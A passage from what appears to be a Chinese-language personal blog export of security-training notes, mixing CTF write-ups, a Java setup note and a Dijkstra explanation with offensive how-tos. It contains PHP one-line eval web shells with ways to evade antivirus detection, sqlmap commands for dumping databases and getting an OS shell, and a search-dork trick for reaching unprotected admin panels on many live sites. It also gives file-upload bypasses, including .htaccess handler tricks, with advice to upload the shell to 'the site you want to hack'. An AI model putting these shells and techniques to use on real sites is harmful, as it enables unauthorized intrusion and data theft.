ia+ejrU04lLhNMdIH3b4vbJKqkkPX89AEk71xTx6x5xhKeJXJiwGyr14ddoPDJhIiG60JUZ2zVra
Si2iTTDv3AO4oRkCKbyGJvc6V4hDHcyRxGPRWkTsu6GvEZNb6aZl2gTyjyuutXduZJ7yZwJkMm57
417pT2hjtr+d49JTIY27in8V2VlOQQ11kGpRm5uT3irht/0VbQQGxuA6JznQr+/tT3m0YcAEpoB8
fpZ/S9RTaoDCjEDQGoVATVAmAyGprmdJFqyiUwxzDOE0Rj1tk93oTI1h8qH8pVyWJ4qs9/qfJEVk
6BudAwzUltxgFnik5YcrXhkccdpFjzRae8EF4rwfeVEwC9CBY7eVpXQLqagMG+XwnRUV2IwScryJ
Lr+oVbxNK+qgnCVKhiJjLh90fhToirw2SNyk28IWLQxrguKhk432jaMhsZ7N8fpZ/S9Ty7hDExI6
QKuE2GiFNdEIqWedY5h3Q06cDhExITKVAOXaoJjPBDcAuFSd3AAwa8UgneKSFNUTMYh6gxoSlxcR
4AAabkrEfzt8gVXudYyDsy9RpWD7iC32D1PDphj2dA7lsJWvAIFGCHcgh+s14lMBHIkEWySPhgzG
kWSZ91zmIIAY8PU/o8OMfSjRPgnEZx5sM1Cka3F1BFoZwiY89anuOXZFK+wHx4kjxDr2Sv51r+da
5nkzIADl6d0YtHjPQaiiSMMe50GP8F3cGd9wPI1bRcaxADQjDj/3q5j0MJxxr6Rkf8KN2bgR9BQE
vyVZDCxLjR+/enVBpCQFGgqCBIg7+pggxk1PPzM02Mg4x/pf/8QAHxEAAgIBBAMAAAAAAAAAAAAA
AQIAEQMSITBQIjFB/9oACAECAQE/AOiBDGhCK4G9GI5OUCOPG+Db7FxouTXHe+t//8QAHhEBAAIB
BAMAAAAAAAAAAAAAAQACEQMwMVAEEiH/2gAIAQMBAT8A6FcT2IWHjYsZGV8app2s/bSvOwijiF9Q
qVlRFz1v/9k=

------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G------
</frame-331E4B087354A2842AEB181D070C71EC@mhtml.blink></Saved>]]></content>
  </entry>
  <entry>
    <title>Http协议真题</title>
    <url>/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/</url>
    <content><![CDATA[<p>这两天在ctfhub上刷了http有关的五道题，还是蛮有收获的【毕竟是个菜逼，学啥都有收获】，记录一下学到的一些东西，</p>
<h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>这道题要求把请求方式换成“CTFHUB”</p>
<p>最简单的一种方法当然是burpsuite抓包，把GET换成CTFHUB</p>
<p>但是在网上还看到一种方法，就是用curl命令修改请求的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v -X CTFHUB http:&#x2F;&#x2F;challenge-74da4bfe747dae2a.sandbox.ctfhub.com:10080&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p>对于curl的一些参数有很多就不一一列举了，这里给一篇写的超详细的<a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank" rel="noopener">大作</a></p>
<h2 id="302重定向"><a href="#302重定向" class="headerlink" title="302重定向"></a>302重定向</h2><p>这题就是抓个包防止它重定向就好了</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>第一种方法：抓个包，把admin的值改成1</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/1.png" alt="1"></p>
<p>第二种方法：使用cookie修改插件【Cookie Quick Manager】改cookie</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/2.png" alt="2"></p>
<h2 id="HTTP基本认证"><a href="#HTTP基本认证" class="headerlink" title="HTTP基本认证"></a>HTTP基本认证</h2><p>HTTP基本认证的过程是这样的：</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/3.png" alt="3"></p>
<ol>
<li>客户端发生请求</li>
<li>服务器端返回401 Unauthorized，返回正文里包含 WWW-Authenticate: Basic realm=”xxx”，xxx表示要用哪个域的用户名和密码</li>
<li>客户端按要求在请求正文里加入 Authorization： Basic YMxhZGpbj==  ，其中“YMxhZGpbj==”通过base64解码后为“admin:password”</li>
<li>服务器端返回成功200</li>
</ol>
<p>那这道题就是拿着他给的词典在burpsuite上跑就行了，不过也学到了个小技巧</p>
<p><img src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/4.png" alt="4"></p>
<p>在Payload Processing模块，可以对变量进行加工，而且以上下为加工顺序，这里就表示先加前缀“admin:”然后对“admin:xxx”整块进行base64加密。</p>
<h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>这题没大明白像考察啥？F12一下就有flag了。。。</p>
]]></content>
      <tags>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>java环境变量配置</title>
    <url>/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>啊啊啊啊啊啊啊啊今天装了jdk11但却发现burpsuite跑不了了淦。没办法只好装回jdk8，配环境变量时又出了好多问题，下面就记录一下以免下次继续。</p>
<p>首先是JAVA_HOME</p>
<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/Snipaste_2020-05-24_21-36-07.png" alt="Snipaste_2020-05-24_21-36-07"></p>
<p>然后是classpath【记住这里一定要小写】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/2.png" alt="2"></p>
<p>然后在PATH里配置</p>
<p><img src="/2020/05/24/java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/3.png" alt="3"></p>
]]></content>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><h3 id="对于GET请求的注入"><a href="#对于GET请求的注入" class="headerlink" title="对于GET请求的注入"></a>对于GET请求的注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&#39;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="对于POST请求的注入"><a href="#对于POST请求的注入" class="headerlink" title="对于POST请求的注入"></a>对于POST请求的注入</h3><p>先把http头写入到同目录下的文件里【post.txt】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;sql&#x2F;sql_post.php HTTP&#x2F;1.1</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 6</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Cookie: __atuvc&#x3D;5%7C1</span><br><span class="line">Host: localhost</span><br><span class="line">Origin: http:&#x2F;&#x2F;localhost</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;sql_post.php</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.117 Safari&#x2F;537.36</span><br><span class="line"></span><br><span class="line">id&#x3D;2</span><br></pre></td></tr></table></figure>

<p>其中post传输的数据与header要空一行，然后构建payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r &quot;post.txt&quot;</span><br></pre></td></tr></table></figure>

<h3 id="对于有表格的注入"><a href="#对于有表格的注入" class="headerlink" title="对于有表格的注入"></a>对于有表格的注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1&#x2F;sql&#x2F;sql_1.php&quot; --forms</span><br></pre></td></tr></table></figure>



<h2 id="对于GET的一次完整注入"><a href="#对于GET的一次完整注入" class="headerlink" title="对于GET的一次完整注入"></a>对于GET的一次完整注入</h2><ol>
<li><p>爆出数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p>如果要爆出当前数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; --tables</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --columns</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出具体内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; --dump</span><br></pre></td></tr></table></figure>

<p>如果爆出指定列内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot;  -D &quot;test&quot; -T &quot;sql_1&quot; -C &quot;name&quot; --dump</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>此次完整注入的原理可见下图</p>
<p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/sql%E7%BB%93%E6%9E%84.jpg" alt="sql结构"></p>
<h2 id="获取shell权限"><a href="#获取shell权限" class="headerlink" title="获取shell权限"></a>获取shell权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --os-shell</span><br></pre></td></tr></table></figure>

<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;sql_1.php?id&#x3D;1&quot; --file-read&#x3D;&quot;D:\phpstudy_pro\WWW\muma.php</span><br></pre></td></tr></table></figure>

<h2 id="多个链接注入"><a href="#多个链接注入" class="headerlink" title="多个链接注入"></a>多个链接注入</h2><p>可以将多个有注入点的链接写入txt文件保存到同目录下然后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -m m.txt</span><br></pre></td></tr></table></figure>

<h2 id="关于burpsuite的log联合使用"><a href="#关于burpsuite的log联合使用" class="headerlink" title="关于burpsuite的log联合使用"></a>关于burpsuite的log联合使用</h2><p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/4.png" alt="4"></p>
<p>找到底下的Proxy勾选Requests</p>
<p><img src="/2020/05/23/sqlmap%E4%BD%BF%E7%94%A8/5.png" alt="5"></p>
<p>保存到同目录下为burp.log，然后输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log</span><br></pre></td></tr></table></figure>







<h2 id="tamper脚本的编写"><a href="#tamper脚本的编写" class="headerlink" title="tamper脚本的编写"></a>tamper脚本的编写</h2><p>tamper脚本实例【test.py】：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload,**kwargs)</span>:</span></span><br><span class="line">    kwargs[<span class="string">'headers'</span>][<span class="string">'X-Forwarded-For'</span>] = <span class="string">"127.0.0.1"</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">"and"</span>,<span class="string">"anandd"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"or"</span>,<span class="string">"oorr"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"select"</span>,<span class="string">"seleselectct"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>php代码如下加入了过滤代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//filter</span></span><br><span class="line">$id = strtolower($id);</span><br><span class="line">$id = str_replace(<span class="string">"and"</span>,<span class="string">""</span>,$id);</span><br><span class="line">$id = str_replace(<span class="string">"or"</span>,<span class="string">""</span>,$id);</span><br><span class="line">$id = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$id);</span><br></pre></td></tr></table></figure>



<p>此时将test.py加入sqlmap的tamper文件夹下然后输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py &quot;http:&#x2F;&#x2F;192.168.1.104&#x2F;sql&#x2F;sql_4.php?id&#x3D;2&quot; --tamper &quot;test&quot;</span><br></pre></td></tr></table></figure>

<p>即可跑出</p>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>NTFS文件流</title>
    <url>/2020/05/21/NTFS%E6%96%87%E4%BB%B6%E6%B5%81/</url>
    <content><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/26108362" target="_blank" rel="noopener">知乎专栏</a></p>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>绕过对php一句话木马查杀的方法</title>
    <url>/2020/05/18/%E7%BB%95%E8%BF%87%E5%AF%B9php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<ol>
<li><p>改变大小写，然后strlower()</p>
</li>
<li><p>文本反转：strrev()</p>
</li>
<li><p>点号分割字符串：”a”.”b”</p>
</li>
<li><p>数组：array(“a”,”b”);   $a[0].$a[1]</p>
</li>
<li><p>干扰函数：var_dump()、print_r()</p>
</li>
<li><p>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line">ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rg</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		@<span class="keyword">eval</span>($a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="keyword">new</span> rg;</span><br><span class="line">$key -&gt; ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>改cknife里的配置【base_64一下】</p>
</li>
</ol>
]]></content>
      <categories>
        <category>米斯特安全培训</category>
      </categories>
  </entry>
  <entry>
    <title>Dijkstra算法</title>
    <url>/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>当我们要寻找无权重边的最短路径时，我们常用广度优先搜索，即第一次遇到结点x就是x的最短路径【如社交媒体上的好友推荐】。但对于那些有权重边的最优解，我们就不能再用广度优先搜索了，因为最先到达x并不能代表这条路径就是最优解，因为每条路径的权重不同。如下图所示：</p>
<p>如果用广度优先搜索会先到达地点B，但地点B并不是最优解</p>
<p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/2.jpg" alt="2"></p>
<p>这时我们就需要用到<strong>Dijkstra</strong>算法了：</p>
<h2 id="基本符号定义"><a href="#基本符号定义" class="headerlink" title="基本符号定义"></a>基本符号定义</h2><ol>
<li>source：表示图中的起始点，缩写是s。</li>
<li>weight[m，n]：表示从结点m到结点n的有向边之权重，如果m到n有多条边【一次到】则取权重最小的那条，缩写为w[m,n]。</li>
<li>min_weight[m]：保存了从s到任意结点的最小权重，缩写为mw[m]。其中mw[s]=0。</li>
<li>Finish：表示已经找到最小权重的结点之集合，一旦放入F，这个结点就不参与将来的计算，缩写为F。</li>
</ol>
<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
<li>设置mw[s]=0。</li>
<li>往集合F里添加结点s，F包含且仅包含结点s。</li>
<li>假设结点s能直接到达的集合为M，对于其中的每一条边m，则把mw[m]设为w[s,m]，同时对其他s不能直接到的结点，将通路设为∞。</li>
</ol>
<h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><h3 id="1-查找最小mv"><a href="#1-查找最小mv" class="headerlink" title="1.查找最小mv"></a>1.查找最小mv</h3><p>当由一个点发散出去多个mw时，从mw数组中选择出其中的最小值【如mw[x]】，此最小值就是s到x</p>
<p>的最小权重，将其放入F数组中。此后x结点就不必被考虑了。</p>
<h3 id="2-更新权重"><a href="#2-更新权重" class="headerlink" title="2.更新权重"></a>2.更新权重</h3><p>然后看看新加入F的结点x，是不是可以直接到达其他结点。如果是，看看这些x到达其他通路的长度，是否比这些点之前的mw更小【mw[x]+w[x,y]&lt;mw[y]】，如果是，就替换这些点mw的值。</p>
<p>重复以上两步，知道集合F包含途中所有结点。</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>F</th>
<th>mw</th>
<th>已确定的mw</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>s</td>
<td>mw[a]=0.5;mw[b]=0.3;mw[c]=0.2;mw[d]=0.4;其他mw=∞</td>
<td>空集</td>
</tr>
<tr>
<td>2</td>
<td>s,c</td>
<td>mw[a]=0.5;mw[b]=0.3;mw[d]=0.4;mw[f]=0.6;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2</td>
</tr>
<tr>
<td>3</td>
<td>s,c,b</td>
<td>mw[a]=0.5;mw[d]=0.4;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3</td>
</tr>
<tr>
<td>4</td>
<td>s,c,b,d</td>
<td>mw[a]=0.5;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4</td>
</tr>
<tr>
<td>5</td>
<td>s,c,b,d,f</td>
<td>mw[a]=0.5;mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4</td>
</tr>
<tr>
<td>6</td>
<td>s,c,b,d,f,a</td>
<td>mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;</td>
</tr>
<tr>
<td>7</td>
<td>s,c,b,d,f,a,e</td>
<td>mw[h]=0.6;mv[g]=0.6</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5</td>
</tr>
<tr>
<td>8</td>
<td>s,c,b,d,f,a,e,h</td>
<td>mv[g]=0.6</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;</td>
</tr>
<tr>
<td>9</td>
<td>s,c,b,d,f,a,e,h,g</td>
<td>空集</td>
<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;mv[g]=0.6</td>
</tr>
</tbody></table>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>正在现学JAVA，之后补上。</p>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>有趣的小技巧</title>
    <url>/2020/05/16/%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h2 id="通过禁用JS来实现直接进入管理员后台"><a href="#通过禁用JS来实现直接进入管理员后台" class="headerlink" title="通过禁用JS来实现直接进入管理员后台"></a>通过禁用JS来实现直接进入管理员后台</h2><ol>
<li><p>利用百度的高级搜索：想一些你觉得很多网站都会有的目录名和文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&#x2F;admin&#x2F;main.html</span><br></pre></td></tr></table></figure>
</li>
<li><p>禁用JS就可直接进入管理员后台查看一些数据</p>
</li>
<li><p>如果想把这个<strong>专用漏洞</strong>提升为<strong>通用漏洞</strong>，那么就在进入发现漏洞网页的首页，随意点进一个链接，一般会显示诸如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;index&#x2F;product.php?id&#x3D;24</span><br></pre></td></tr></table></figure>

<p>此时复制并再次使用百度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:&#x2F;product.php?id&#x3D;</span><br></pre></td></tr></table></figure>

<p>会显示出许多可能和该网站使用同一网站模板、存在同样漏洞的网站。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>文件有关漏洞</title>
    <url>/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;xxx;</span><br></pre></td></tr></table></figure>

<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>先找到下载链接，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;abc&#x2F;hhh&#x2F;download.php?file&#x3D;.&#x2F;download&#x2F;abcdef.txt</span><br></pre></td></tr></table></figure>

<p>其中file=之后的内容可能会被加密。</p>
<p>改变file=之后的文件名就可以下载该文件</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>将此文件保存为1.php,然后将此文件上传到你想黑的网站里。</p>
<p>使用Cknife进行入侵，其中后面小空格里填上你一句话里的key。</p>
<blockquote>
<p>原理：eval函数执行函数内的操作，而当你把一段命令用POST传过去后，服务器端便会执行这段php代码</p>
</blockquote>
<h3 id="一些文件上传的绕过方法"><a href="#一些文件上传的绕过方法" class="headerlink" title="一些文件上传的绕过方法"></a>一些文件上传的绕过方法</h3><h4 id="黑名单文件类型"><a href="#黑名单文件类型" class="headerlink" title="黑名单文件类型"></a>黑名单文件类型</h4><p><img src="/2020/05/16/%E6%96%87%E4%BB%B6%E6%9C%89%E5%85%B3%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p>
<p>这时可以使用bp抓包，把名字改一下即可绕过。比如在.php后加个空格、改个大小写、用php5、phtml此类扩展名。</p>
<h4 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h4><p>抓包修改content-type：<a href="https://www.fujieace.com/penetration-test/file-upload-mime.html" target="_blank" rel="noopener">相关内容。</a></p>
<h4 id="JS验证"><a href="#JS验证" class="headerlink" title="JS验证"></a>JS验证</h4><ol>
<li>可以进用JS</li>
<li>可以f12查看源代码，然后把有关验证JS的链接给删除。</li>
</ol>
<h4 id="内容验证"><a href="#内容验证" class="headerlink" title="内容验证"></a>内容验证</h4><p>即后缀名可以随便修改，但是文件内容必须符合，比如要求文件格式为jpg。</p>
<p>此时我们就可以把一句话隐写到php文件里，形成图片一句话，从而绕过验证。</p>
<p><a href="http://albatross-g.site/2020/01/11/%E6%96%87%E4%BB%B6%E7%9A%84%E5%90%88%E5%B9%B6%E4%B8%8E%E5%88%86%E7%A6%BB/" target="_blank" rel="noopener">详情见我之前的文章。</a></p>
<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>这题是在ctfhub里刷到的一道比较新颖的题【我见识短浅】，来好好的记录一下啦。</p>
<p>这道题参考了<a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">这篇博客。</a></p>
<blockquote>
<p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>根据上面文档的总结，修改.htaccess文件大致上有两种方法：</p>
<ul>
<li><pre><code>AddType application/x-httpd-php .png   //png就是修改为的文件类型
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  将此文件命名为.htaccess上传即可</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
&lt;FilesMatch &quot;muma.php&quot;&gt;   
//双引号里就是匹配的文件名，也就是一句话木马的文件名【没有.php好像也可以】
    SetHandler application/x-httpd-php
&lt;FilesMatch&gt;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">二者选一上传之后再上传muma.png，这个配置文件就可以帮你把png改成php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 文件包含</span><br><span class="line"></span><br><span class="line">### %00截断</span><br><span class="line"></span><br><span class="line">%00截断基本已经全部禁用，可以参考[这篇](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zpy1998zpy&#x2F;article&#x2F;details&#x2F;80545408)。</span><br><span class="line"></span><br><span class="line">### phar&#x2F;zip协议</span><br><span class="line"></span><br><span class="line">我们可能会遇到以下两种限制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line"></span><br><span class="line">if(isset($file) &amp;&amp; strtolower(substr($file, -4)) &#x3D;&#x3D; &quot;.jpg&quot;)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</code></pre></li>
</ul>
<p>此时我们可以实行以下操作：</p>
<ol>
<li>创建一个1.php，里面写入php代码【phpinfo()】。</li>
<li>将此文件重命名为1.jpg【代码限制要jpg】。</li>
<li>压缩1.jpg为1.zip</li>
</ol>
<p>构建payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;phar:&#x2F;&#x2F;c.zip&#x2F;c.jpg</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;file&#x2F;1.php?file&#x3D;zip:&#x2F;&#x2F;c.zip%23c.jpg</span><br></pre></td></tr></table></figure>





<p>接下来这种情况也会遇到：</p>
